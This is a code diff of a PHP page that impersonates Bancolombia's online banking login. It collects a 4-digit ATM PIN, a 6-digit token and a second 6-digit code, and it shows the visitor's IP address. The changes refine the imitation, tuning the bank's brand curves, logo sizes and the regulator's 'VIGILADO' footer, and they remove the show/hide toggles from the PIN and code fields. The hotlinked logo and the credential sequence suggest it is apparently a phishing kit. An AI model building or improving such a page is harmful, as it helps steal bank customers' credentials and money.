@@ -83,18 +83,20 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
 <body>
 
 <div class="bg-curves">
-<svg viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
-  <!-- 3 lineas diagonales gruesas estilo Bancolombia -->
-  <path d="M -80 -20 L 520 480" stroke="#FF7A1A" stroke-width="42" fill="none" stroke-linecap="round"/>
-  <path d="M -80 60 L 440 520" stroke="#FDDA24" stroke-width="38" fill="none" stroke-linecap="round"/>
-  <path d="M -80 140 L 360 560" stroke="#8330C2" stroke-width="34" fill="none" stroke-linecap="round"/>
+<svg viewBox="0 0 1366 747" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+  <path d="M1195.85 98.3063L1200.85 91.8706L1206.12 85.6675C1207.84 83.5683 1209.7 81.5987 1211.56 79.6167L1214.33 76.6428C1215.24 75.6426 1216.17 74.6588 1217.16 73.7244L1222.95 68.0256C1224.89 66.1362 1226.96 64.3807 1228.95 62.5511L1231.98 59.8364L1235.11 57.2474C1237.21 55.5412 1239.27 53.7815 1241.4 52.1207C1249.96 45.4771 1258.97 39.4305 1268.3 33.8921C1277.71 28.4938 1287.48 23.7169 1297.56 19.6193C1307.7 15.6533 1318.17 12.4633 1328.86 10.1356C1339.57 7.84493 1350.56 6.6924 1361.59 6.5257C1372.62 6.30137 1383.73 7.55474 1394.57 9.93595C1400.03 11 1405.33 12.7679 1410.63 14.4432L1418.41 17.483C1419.72 17.9563 1420.98 18.5655 1422.23 19.1788L1425.99 20.9941" stroke="#9062CD" stroke-width="12" stroke-linecap="round" fill="none"/>
+  <path d="M1085.78 293.919L1193.26 149.641L1220.12 113.653C1228.73 102.296 1238.62 91.8308 1249.44 82.3904C1271.1 63.5218 1296.44 48.6603 1323.51 38.9688" stroke="#FDDA23" stroke-width="25" stroke-linecap="round" fill="none"/>
+  <path d="M-60.5273 346.353C2.09119 253.284 140.475 207.092 246.083 245.424C292.71 262.348 333.515 292.015 371.297 323.559" stroke="#FF7E41" stroke-width="25" stroke-linecap="round" fill="none"/>
+  <path d="M152.605 213.708C172.683 211.389 192.995 211.708 212.879 214.764L216.61 215.31C217.855 215.493 219.082 215.769 220.318 215.995L227.725 217.425L235.057 219.179L238.72 220.074L242.344 221.122C252.053 223.746 261.494 227.29 270.792 231.122C275.387 233.176 280.016 235.156 284.475 237.51C289.019 239.692 293.373 242.242 297.762 244.722C299.962 245.948 302.05 247.379 304.199 248.7C306.328 250.054 308.49 251.357 310.53 252.851L316.729 257.206C318.755 258.655 320.63 260.081 322.588 261.518L369.111 295.962L462.154 364.849L508.677 399.293L520.308 407.902C524.179 410.738 528.08 413.743 531.908 416.354L543.431 424.447L555.342 431.94" stroke="#FDDA23" stroke-width="15" stroke-linecap="round" fill="none"/>
+  <path d="M870.003 458.937C877.633 456.204 884.951 452.712 892.388 449.511C896.043 447.774 899.642 445.916 903.274 444.127L908.71 441.417L914.006 438.447C917.527 436.451 921.094 434.528 924.58 432.474L934.874 426.031C938.354 423.954 941.632 421.577 944.958 419.27L949.939 415.802C951.603 414.647 953.279 413.511 954.854 412.239L964.463 404.818L966.868 402.966L969.177 400.998L973.791 397.053L978.406 393.111C979.171 392.449 979.957 391.811 980.705 391.129L982.91 389.045L991.733 380.709C1003.15 369.26 1014.19 357.366 1023.97 344.466C1028.96 338.224 1033.9 331.41 1038.86 324.752L1053.71 304.718L1083.42 264.652L1142.84 184.516" stroke="#FF7E41" stroke-width="15" stroke-linecap="round" fill="none"/>
+  <path d="M451.381 384.27L504.469 423.886L511.106 428.837L518.022 433.752C522.668 436.996 527.203 440.406 532.057 443.337L539.233 447.887L542.824 450.159C544.011 450.931 545.276 451.575 546.497 452.287C551.442 455.049 556.326 457.92 561.32 460.584C601.385 481.735 645.293 495.306 690.115 500.679" stroke="#9062CD" stroke-width="25" stroke-linecap="round" fill="none"/>
 </svg>
 </div>
 
 <div class="page">
   <div class="topbar">
     <div class="logo">
-      <img src="https://images.seeklogo.com/logo-png/40/2/bancolombia-s-a-logo-png_seeklogo-402324.png" width="180" alt="Bancolombia" style="display:block;margin:0 auto">
+      <img src="https://images.seeklogo.com/logo-png/40/2/bancolombia-s-a-logo-png_seeklogo-402324.png" width="140" alt="Bancolombia" style="display:block;margin:0 auto">
     </div>
     <div class="subtitle" id="page-title">Sucursal Virtual Personas</div>
   </div>
@@ -111,8 +113,7 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
         </div>
         <div class="bt">
           <b>Esto te interesa</b>
-          <span>Desde el 2 de octubre de 2026 actualizamos el reglamento de las cuentas de ahorro.</span>
-          <a>Conócelo</a>
+          <span>Desde el 2 de octubre de 2026 actualizamos el reglamento de las cuentas de ahorro. <a>Conócelo</a></span>
         </div>
       </div>
       <div class="card">
@@ -129,10 +130,6 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
         <div class="fld" id="fld-pass">
           <span class="ic"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
           <input type="password" id="pass" placeholder="Clave del cajero" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-          <span class="eye-toggle" id="eye-pass" onclick="toggleEye('pass','eye-pass')">
-            <svg viewBox="0 0 24 24" class="eye-open" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-            <svg viewBox="0 0 24 24" class="eye-closed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
-          </span>
         </div>
         <div class="err-msg" id="err-pass">Ingresa tu clave</div>
         <a class="flink">¿Olvidaste o bloqueaste tu clave?</a>
@@ -246,11 +243,6 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
           <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
           <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
         </div>
-        <span class="eye-toggle-inline" id="eye-token" onclick="toggleCodeEye('token-inputs','eye-token')">
-          <svg viewBox="0 0 24 24" class="eye-open" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-          <svg viewBox="0 0 24 24" class="eye-closed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
-          <span class="eye-label">Mostrar</span>
-        </span>
         <button class="btn btn-primary" id="btn-token" disabled onclick="submitToken()">Verificar token</button>
         <button class="btn btn-outline" onclick="resetAll();show('scr-login')">Volver</button>
       </div>
@@ -270,11 +262,6 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
           <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
           <input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off"><input maxlength="1" inputmode="numeric" autocomplete="off">
         </div>
-        <span class="eye-toggle-inline" id="eye-clave" onclick="toggleCodeEye('clave-inputs','eye-clave')">
-          <svg viewBox="0 0 24 24" class="eye-open" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-          <svg viewBox="0 0 24 24" class="eye-closed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
-          <span class="eye-label">Mostrar</span>
-        </span>
         <button class="btn btn-primary" id="btn-clave" disabled onclick="submitClave()">Continuar</button>
         <button class="btn btn-outline" onclick="resetAll();show('scr-login')">Volver</button>
       </div>
@@ -304,11 +291,11 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
   </div>
   <div class="footer-div"></div>
   <div class="footer-bottom">
-    <div class="flogo">
-      <img src="https://images.seeklogo.com/logo-png/40/2/bancolombia-s-a-logo-png_seeklogo-402324.png" width="110" alt="Bancolombia" style="display:block;margin:0 auto">
-    </div>
-    <div>
-      <span class="vig">VIGILADO</span> · Superintendencia Financiera de Colombia
+    <div class="footer-left">
+      <div class="flogo">
+        <img src="https://images.seeklogo.com/logo-png/40/2/bancolombia-s-a-logo-png_seeklogo-402324.png" width="90" alt="Bancolombia">
+      </div>
+      <div class="vigilado"><span class="vig">VIGILADO</span> · Superintendencia Financiera de Colombia</div>
     </div>
     <div class="ip">Dirección IP: <?= htmlspecialchars($clientIp) ?><br><?= htmlspecialchars($fecha) ?></div>
   </div>
